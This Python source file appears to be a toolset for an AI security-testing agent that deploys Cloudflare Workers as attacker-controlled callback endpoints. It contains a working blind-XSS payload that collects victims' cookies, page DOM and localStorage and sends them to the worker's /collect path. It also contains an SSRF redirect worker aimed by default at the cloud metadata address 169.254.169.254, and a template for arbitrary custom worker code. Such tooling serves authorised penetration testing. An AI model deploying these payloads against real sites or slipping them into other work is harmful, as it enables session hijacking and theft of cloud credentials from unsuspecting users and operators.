"""Wrangler: deploy Cloudflare Workers as custom OAST endpoints.

Wraps the ``wrangler`` CLI (cloudflare/workers-sdk) to give the agent
attacker-controlled, programmable callback infrastructure at Cloudflare's
edge. Complements the passive OOB providers (``callback.py`` — webhook.site /
interactsh), which can only *receive* callbacks, with workers that can also
*serve content*: blind XSS payload hosting, custom response bodies, and 302
redirectors for SSRF chain escalation.

Templates:
    callback   — logs every request (method, URL, headers, body, CF geo
                 metadata) and answers 200 OK with permissive CORS.
    blind-xss  — serves a JS probe at ``/`` that collects cookies, DOM,
                 localStorage, origin and referrer from the *victim* page and
                 POSTs them back to ``/collect`` on the same worker.
    redirect   — answers 302 to a configurable target (SSRF filter bypass,
                 protocol downgrade, chained internal redirection).
    custom     — arbitrary worker code supplied by the caller.

Auth is non-interactive and comes entirely from the environment, per
wrangler's own contract: ``CLOUDFLARE_API_TOKEN`` and
``CLOUDFLARE_ACCOUNT_ID``. The ``CF_API_TOKEN`` / ``CF_ACCOUNT_ID`` aliases
(the env contract used by the flareprox tool in this capability) are accepted
as fallbacks and mapped onto wrangler's names, so one credential pair drives
both tools. Nothing is persisted by this toolset — no wrangler login state is
created or required.

The binary is installed by ``scripts/install_tools.sh`` and the runtime
Dockerfile; the ``wrangler`` preflight check in capability.yaml reports its
absence.
"""

from __future__ import annotations

import asyncio
import json
import os
import re
import secrets
import shutil
import string
import tempfile
from pathlib import Path
from typing import Annotated

import httpx
from dreadnode.agents.tools import Toolset, tool_method

_MAX_OUTPUT = 50_000
_WORKER_PREFIX = "dn-oast-"
_NAME_SUFFIX_LENGTH = 8
# Wrangler's own config validation (verified against wrangler 4.x):
# alphanumeric, lowercase, dashes and underscores, first character may not be
# a dash. Enforced client-side so an invalid name fails fast with a clear
# message instead of a wrangler parse error — and so a crafted name can never
# reach the generated wrangler.toml as anything but a plain identifier.
_NAME_PATTERN = re.compile(r"^[a-z0-9_][a-z0-9_-]*$")
_API_BASE = "https://api.cloudflare.com/client/v4"
# Compatibility date for generated wrangler.toml files. The templates only
# use stable Workers APIs (fetch, Response, console.log), so any recent date
# is safe; pinned rather than --latest so deploys are reproducible.
_COMPATIBILITY_DATE = "2025-01-01"
# Suppress wrangler telemetry from the runtime sandbox: keeps tool behavior
# deterministic and avoids outbound requests that disconnected deployments
# cannot make.
_BASE_ENV = {"WRANGLER_SEND_METRICS": "false"}
# Safety cap on list pagination: 20 pages x whatever the API's per-page size
# is. An account with more OAST workers than that has bigger problems.
_MAX_LIST_PAGES = 20

# ---------------------------------------------------------------------------
# Built-in worker templates
# ---------------------------------------------------------------------------

_OAST_CALLBACK_WORKER = """\
// OAST callback worker — logs every request and returns a configurable response.
export default {
  async fetch(request) {
    const url = new URL(request.url);
    const headers = Object.fromEntries(request.headers.entries());
    const body = request.method !== "GET" && request.method !== "HEAD"
      ? await request.text()
      : null;

    // Log the interaction so `wrangler tail` can capture it.
    console.log(JSON.stringify({
      timestamp: new Date().toISOString(),
      method: request.method,
      url: request.url,
      path: url.pathname + url.search,
      headers,
      body,
      cf: request.cf || {},
    }));

    return new Response("OK", {
      status: 200,
      headers: { "Content-Type": "text/plain", "Access-Control-Allow-Origin": "*" },
    });
  },
};
"""

_BLIND_XSS_WORKER = """\
// Blind XSS payload server — serves a JS payload that exfiltrates page data
// back to this same worker at /collect.
export default {
  async fetch(request) {
    const url = new URL(request.url);

    if (url.pathname === "/collect") {
      const body = request.method !== "GET" ? await request.text() : "";
      console.log(JSON.stringify({
        type: "xss_exfil",
        timestamp: new Date().toISOString(),
        method: request.method,
        headers: Object.fromEntries(request.headers.entries()),
        body,
      }));
      return new Response("OK", {
        status: 200,
        headers: { "Access-Control-Allow-Origin": "*" },
      });
    }

    if (url.pathname === "/options" || request.method === "OPTIONS") {
      return new Response(null, {
        status: 204,
        headers: {
          "Access-Control-Allow-Origin": "*",
          "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
          "Access-Control-Allow-Headers": "Content-Type",
        },
      });
    }

    // Default: serve the XSS probe payload
    const selfUrl = url.origin;
    const payload = `(function(){
      var d = document;
      var data = {
        url: location.href,
        cookie: d.cookie,
        dom: d.documentElement.outerHTML.substring(0, 8192),
        localStorage: JSON.stringify(Object.entries(localStorage || {})),
        origin: location.origin,
        referrer: d.referrer
      };
      var x = new XMLHttpRequest();
      x.open("POST", "${selfUrl}/collect", true);
      x.setRequestHeader("Content-Type", "application/json");
      x.send(JSON.stringify(data));
    })();`;

    return new Response(payload, {
      status: 200,
      headers: {
        "Content-Type": "application/javascript",
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "no-store",
      },
    });
  },
};
"""

_REDIRECT_WORKER = """\
// SSRF redirect worker — 302-redirects all requests to a configurable target.
// The REDIRECT_TARGET var is set at deploy time (--var REDIRECT_TARGET:<url>).
export default {
  async fetch(request, env) {
    const target = env.REDIRECT_TARGET || "http://169.254.169.254/latest/meta-data/";
    const url = new URL(request.url);

    console.log(JSON.stringify({
      type: "redirect",
      timestamp: new Date().toISOString(),
      method: request.method,
      from: request.url,
      to: target,
      headers: Object.fromEntries(request.headers.entries()),
    }));

    return Response.redirect(target, 302);
  },
};
"""

_TEMPLATES: dict[str, str] = {
    "callback": _OAST_CALLBACK_WORKER,
    "blind-xss": _BLIND_XSS_WORKER,
    "redirect": _REDIRECT_WORKER,
}


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------


# ANSI escape sequences (wrangler colorizes even when piped) — noise for
# the LLM, so strip them from every output surface.
_ANSI_PATTERN = re.compile(r"\x1b\[[0-9;]*m")


def _clean(text: str) -> str:
    """Strip ANSI color codes from wrangler output."""
    return _ANSI_PATTERN.sub("", text)


def _resolve_env() -> dict[str, str]:
    """Resolve Cloudflare credentials with wrangler-native names.

    ``CLOUDFLARE_API_TOKEN`` / ``CLOUDFLARE_ACCOUNT_ID`` are wrangler's own
    contract. The ``CF_API_TOKEN`` / ``CF_ACCOUNT_ID`` aliases (used by the
    flareprox tool in this capability) are accepted as fallbacks so one
    credential pair can drive both tools.
    """
    api_token = (
        os.environ.get("CLOUDFLARE_API_TOKEN", "").strip()
        or os.environ.get("CF_API_TOKEN", "").strip()
    )
    account_id = (
        os.environ.get("CLOUDFLARE_ACCOUNT_ID", "").strip()
        or os.environ.get("CF_ACCOUNT_ID", "").strip()
    )
    return {
        "CLOUDFLARE_API_TOKEN": api_token,
        "CLOUDFLARE_ACCOUNT_ID": account_id,
    }


def _auth_error() -> str | None:
    """Return a setup message when Cloudflare auth is missing, else None."""
    env = _resolve_env()
    if not env["CLOUDFLARE_API_TOKEN"]:
        return (
            "CLOUDFLARE_API_TOKEN is not set. Create an API token at "
            "https://dash.cloudflare.com/profile/api-tokens with Workers "
            "Scripts Edit permission and export it (CF_API_TOKEN is also "
            "accepted)."
        )
    if not env["CLOUDFLARE_ACCOUNT_ID"]:
        return (
            "CLOUDFLARE_ACCOUNT_ID is not set. Find your Account ID in the "
            "Cloudflare dashboard sidebar and export it (CF_ACCOUNT_ID is "
            "also accepted)."
        )
    return None


def _binary_error() -> str | None:
    """Return a setup message when wrangler is not on PATH, else None."""
    if shutil.which("wrangler") is None:
        return (
            "wrangler not found on PATH. It is installed by the web-security "
            "capability (scripts/install_tools.sh); install manually with "
            "`npm install -g wrangler`."
        )
    return None


def _validate_name(name: str) -> str | None:
    """Validate a worker name; return an error message or None."""
    if not name:
        return "Error: Worker name is required."
    if not _NAME_PATTERN.fullmatch(name):
        return (
            f"Error: Invalid worker name '{name}'. Use lowercase "
            "alphanumerics, dashes and underscores, starting with a letter "
            "or digit."
        )
    return None


def _generate_name() -> str:
    """Generate a short unique worker name with the dn-oast- prefix."""
    suffix = "".join(
        secrets.choice(string.ascii_lowercase + string.digits)
        for _ in range(_NAME_SUFFIX_LENGTH)
    )
    return f"{_WORKER_PREFIX}{suffix}"


def _extract_worker_url(output: str) -> str:
    """Extract the deployed workers.dev URL from wrangler deploy output."""
    for line in output.splitlines():
        stripped = line.strip()
        if stripped.startswith("https://") and ".workers.dev" in stripped:
            return stripped
    return ""


async def _run(
    args: list[str],
    *,
    timeout: int = 120,
    cwd: str | None = None,
) -> tuple[int, str, str, bool]:
    """Run a wrangler command; return (returncode, stdout, stderr, timed_out).

    Env is the current environment plus wrangler telemetry suppression and
    the CF_* -> CLOUDFLARE_* credential aliases, so wrangler sees one
    consistent credential contract regardless of which pair the operator set.

    stdout and stderr are kept separate: `tail --format json` streams events
    to stdout while wrangler writes banners and errors to stderr, so callers
    must be able to tell them apart.
    """
    wrangler = shutil.which("wrangler")
    if wrangler is None:
        raise FileNotFoundError(_binary_error())

    env = {**os.environ, **_BASE_ENV}
    resolved = _resolve_env()
    for name, value in resolved.items():
        if value and not os.environ.get(name, "").strip():
            env[name] = value

    proc = await asyncio.create_subprocess_exec(
        wrangler,
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
        cwd=cwd,
        env=env,
    )
    try:
        stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=timeout)
        return (
            proc.returncode or 0,
            _clean(stdout.decode(errors="replace")).strip()[:_MAX_OUTPUT],
            _clean(stderr.decode(errors="replace")).strip()[:_MAX_OUTPUT],
            False,
        )
    except asyncio.TimeoutError:
        # Kill and reap so no zombie is left behind; report whatever output
        # was already captured — for `tail` the kill is the designed stop.
        proc.kill()
        try:
            stdout, stderr = await asyncio.wait_for(proc.communicate(), timeout=5)
        except asyncio.TimeoutError:
            stdout = stderr = b""
        return (
            proc.returncode or 0,
            _clean(stdout.decode(errors="replace")).strip()[:_MAX_OUTPUT],
            _clean(stderr.decode(errors="replace")).strip()[:_MAX_OUTPUT],
            True,
        )


def _combined(stdout: str, stderr: str) -> str:
    """Merge wrangler stdout/stderr for display, stderr last, truncated."""
    output = stdout
    if stderr:
        output = f"{stdout}\n{stderr}" if stdout else stderr
    return output[:_MAX_OUTPUT]


def _format_tail_output(output: str) -> str:
    """Format `wrangler tail --format json` output into readable lines.

    Each stdout line is a JSON event with ``logs`` (console.log output),
    ``exceptions`` and, for request events, ``event.request``. Both surfaces
    are extracted so custom workers that never call console.log still show
    the request that reached them.
    """
    lines: list[str] = []
    for raw in output.splitlines():
        raw = raw.strip()
        if not raw:
            continue
        try:
            evt = json.loads(raw)
        except json.JSONDecodeError:
            lines.append(raw)
            continue

        parts: list[str] = []

        request = (
            evt.get("event", {}).get("request")
            if isinstance(evt.get("event"), dict)
            else None
        )
        if isinstance(request, dict) and request.get("url"):
            method = str(request.get("method", "GET")).upper()
            parts.append(f"{method} {request['url']}")

        for log_entry in evt.get("logs", []):
            if not isinstance(log_entry, dict):
                continue
            message = log_entry.get("message", [])
            if isinstance(message, list):
                text = " ".join(str(m) for m in message)
            else:
                text = str(message)
            if text:
                parts.append(text)

        for exc in evt.get("exceptions", []):
            if isinstance(exc, dict) and exc.get("name"):
                parts.append(f"{exc['name']}: {exc.get('message', '')}")

        if parts:
            lines.append(" | ".join(parts)[:500])

    return "\n".join(lines)


# ---------------------------------------------------------------------------
# Toolset
# ---------------------------------------------------------------------------


class Wrangler(Toolset):
    """Deploy Cloudflare Workers as custom OAST endpoints.

    Wraps the wrangler CLI to deploy, monitor, list, and delete Workers for
    out-of-band testing: blind XSS payload hosting, configurable callback
    receivers, and SSRF redirect servers. Requires CLOUDFLARE_API_TOKEN and
    CLOUDFLARE_ACCOUNT_ID (CF_API_TOKEN / CF_ACCOUNT_ID also accepted).
    """

    @tool_method(name="wrangler_status", catch=True)
    async def status(self) -> str:
        """Check wrangler availability and Cloudflare authentication.

        Verifies the wrangler binary is installed and the Cloudflare API
        token is valid. Call this before deploying workers.
        """
        binary_err = _binary_error()
        if binary_err:
            return binary_err

        auth_err = _auth_error()
        if auth_err:
            return auth_err

        # `whoami --json` exits non-zero when not authenticated, unlike plain
        # `whoami` which prints a "not authenticated" notice with exit 0.
        try:
            returncode, stdout, stderr, timed_out = await _run(
                ["whoami", "--json"], timeout=30
            )
        except FileNotFoundError as e:
            return f"Error: {e}"

        if timed_out:
            return "Error: wrangler whoami timed out."

        info: dict[str, object] | None = None
        for line in stdout.splitlines():
            try:
                parsed = json.loads(line)
                if isinstance(parsed, dict):
                    info = parsed
            except json.JSONDecodeError:
                continue

        if returncode != 0:
            if isinstance(info, dict) and info.get("loggedIn") is False:
                return (
                    "Error: wrangler reports not logged in. "
                    "Check CLOUDFLARE_API_TOKEN."
                )
            return (
                "Error: token check failed (auth env vars are set but the "
                f"token was rejected):\n{_combined(stdout, stderr)}"
            )

        return f"wrangler operational.\n{_combined(stdout, stderr)}"

    @tool_method(name="wrangler_deploy", catch=True)
    async def deploy(
        self,
        template: Annotated[
            str,
            (
                "Worker template: 'callback' (OAST request logger), "
                "'blind-xss' (serves XSS probe + collects exfil), "
                "'redirect' (302 redirect for SSRF chains), "
                "or 'custom' (provide your own code via worker_code)."
            ),
        ] = "callback",
        name: Annotated[
            str,
            "Worker name. Leave empty for an auto-generated name.",
        ] = "",
        worker_code: Annotated[
            str,
            "Custom worker JavaScript code. Only used when template='custom'.",
        ] = "",
        redirect_target: Annotated[
            str,
            "Full redirect target URL incl. scheme (only for template='redirect').",
        ] = "",
    ) -> str:
        """Deploy a Cloudflare Worker for OAST/blind testing.

        Deploys a Worker to Cloudflare's edge and returns its public
        workers.dev URL. The worker is immediately available for receiving
        callbacks, serving payloads, or redirecting requests. Use
        wrangler_tail to check for incoming interactions, and wrangler_delete
        to clean up.
        """
        auth_err = _auth_error()
        if auth_err:
            return auth_err

        if template == "custom":
            if not worker_code.strip():
                return "Error: worker_code is required when template='custom'."
            code = worker_code
        elif template in _TEMPLATES:
            code = _TEMPLATES[template]
        else:
            return (
                f"Error: Unknown template '{template}'. "
                f"Choose from: {', '.join(sorted(_TEMPLATES))} or 'custom'."
            )

        worker_name = name.strip() if name.strip() else _generate_name()
        name_err = _validate_name(worker_name)
        if name_err:
            return name_err

        if template == "redirect" and redirect_target:
            if not re.match(r"^https?://", redirect_target):
                return (
                    "Error: redirect_target must be a full URL including "
                    "scheme (e.g. http://169.254.169.254/latest/meta-data/)."
                )

        # Build the project in a temp directory; wrangler reads wrangler.toml
        # from cwd. The account comes from CLOUDFLARE_ACCOUNT_ID in the env
        # (verified: wrangler picks it up without a toml account_id key).
        tmpdir = tempfile.mkdtemp(prefix="dn-wrangler-")
        try:
            wrangler_toml = (
                f'name = "{worker_name}"\n'
                f'main = "worker.js"\n'
                f'compatibility_date = "{_COMPATIBILITY_DATE}"\n'
            )
            Path(tmpdir, "wrangler.toml").write_text(wrangler_toml)
            Path(tmpdir, "worker.js").write_text(code)

            args = ["deploy", "--no-bundle"]
            if template == "redirect" and redirect_target:
                # --var keeps the target out of wrangler.toml entirely, so it
                # can never break out of a quoted toml string.
                args.append(f"--var=REDIRECT_TARGET:{redirect_target}")

            returncode, stdout, stderr, timed_out = await _run(
                args, cwd=tmpdir, timeout=180
            )
            result = _combined(stdout, stderr)
            if timed_out:
                return f"Error: wrangler deploy timed out.\n{result}"
            if returncode != 0:
                return f"Error: wrangler deploy failed:\n{result}"

            url = _extract_worker_url(result)
            if url:
                return (
                    f"Worker '{worker_name}' deployed successfully.\n"
                    f"URL: {url}\n\n"
                    f"Template: {template}\n"
                    f"Use wrangler_tail to monitor incoming requests.\n"
                    f"Use wrangler_delete to remove when done."
                )
            return f"Deploy completed but no workers.dev URL was reported:\n{result}"
        finally:
            shutil.rmtree(tmpdir, ignore_errors=True)

    @tool_method(name="wrangler_tail", catch=True)
    async def tail(
        self,
        name: Annotated[str, "Worker name to tail logs for."],
        seconds: Annotated[
            int,
            "How many seconds to listen for events (default: 10, max: 60).",
        ] = 10,
    ) -> str:
        """Capture recent log events from a deployed worker.

        Connects to the worker's real-time log stream for the specified
        duration and returns console.log output plus request details (method,
        URL). Use after injecting callback URLs to check if the target made
        requests to your worker.
        """
        auth_err = _auth_error()
        if auth_err:
            return auth_err

        worker_name = name.strip()
        name_err = _validate_name(worker_name)
        if name_err:
            return name_err

        duration = max(1, min(seconds, 60))

        # wrangler tail streams indefinitely; the subprocess timeout below
        # is the intended stop mechanism, and its captured output is the
        # payload, not an error.
        try:
            returncode, stdout, stderr, timed_out = await _run(
                ["tail", worker_name, "--format", "json"],
                timeout=duration + 10,
            )
        except FileNotFoundError as e:
            return f"Error: {e}"

        if not timed_out and returncode != 0:
            return f"Error: wrangler tail failed:\n{_combined(stdout, stderr)}"

        formatted = _format_tail_output(stdout)
        if formatted:
            return f"Events from '{worker_name}':\n{formatted}"

        return f"No events received from '{worker_name}' in {duration}s."

    @tool_method(name="wrangler_list", catch=True)
    async def list_workers(self) -> str:
        """List deployed Cloudflare Workers.

        Shows all workers in the account via the Cloudflare API. Workers
        created by this toolset use the 'dn-oast-' prefix for easy
        identification.
        """
        auth_err = _auth_error()
        if auth_err:
            return auth_err

        env = _resolve_env()
        scripts: list[str] = []
        try:
            async with httpx.AsyncClient(timeout=30.0) as client:
                # Follow the API's own result_info pagination so accounts with
                # many workers are listed completely, without guessing what
                # the per-page limit is (the API tells us per_page/total).
                page = 1
                while page <= _MAX_LIST_PAGES:
                    response = await client.get(
                        f"{_API_BASE}/accounts/{env['CLOUDFLARE_ACCOUNT_ID']}/workers/scripts",
                        params={"page": page},
                        headers={
                            "Authorization": f"Bearer {env['CLOUDFLARE_API_TOKEN']}",
                        },
                    )
                    if response.status_code != 200:
                        return f"Error: Cloudflare API returned HTTP {response.status_code}: {response.text[:500]}"

                    try:
                        body = response.json()
                    except ValueError:
                        return f"Error: Cloudflare API returned non-JSON response: {response.text[:500]}"
                    if not isinstance(body, dict) or not body.get("success", False):
                        errors = (
                            body.get("errors", []) if isinstance(body, dict) else []
                        )
                        return f"Error: Cloudflare API reported failure: {errors}"

                    scripts.extend(
                        str(s.get("id", ""))
                        for s in body.get("result", []) or []
                        if isinstance(s, dict) and s.get("id")
                    )

                    result_info = body.get("result_info") or {}
                    total = result_info.get("total_count", len(scripts))
                    per_page = result_info.get("per_page") or len(scripts) or 1
                    if page * per_page >= total:
                        break
                    page += 1
        except httpx.HTTPError as e:
            return f"Error: Cloudflare API request failed: {e}"
        if not scripts:
            return "No workers deployed in this account."

        lines = [f"{len(scripts)} worker(s) deployed:"]
        for script in sorted(scripts):
            marker = (
                "  (created by this toolset)"
                if script.startswith(_WORKER_PREFIX)
                else ""
            )
            lines.append(f"  - {script}{marker}")
        return "\n".join(lines)

    @tool_method(name="wrangler_delete", catch=True)
    async def delete(
        self,
        name: Annotated[str, "Name of the worker to delete."],
    ) -> str:
        """Delete a deployed Cloudflare Worker.

        Removes the worker and its workers.dev route. Use this to clean up
        OAST workers after testing is complete.
        """
        auth_err = _auth_error()
        if auth_err:
            return auth_err

        worker_name = name.strip()
        name_err = _validate_name(worker_name)
        if name_err:
            return name_err

        try:
            returncode, stdout, stderr, timed_out = await _run(
                ["delete", worker_name, "--force"], timeout=60
            )
        except FileNotFoundError as e:
            return f"Error: {e}"

        result = _combined(stdout, stderr)
        if timed_out:
            return f"Error: wrangler delete timed out.\n{result}"
        if returncode != 0:
            return f"Error: wrangler delete failed:\n{result}"
        return f"Worker '{worker_name}' deleted.\n{result}".strip()
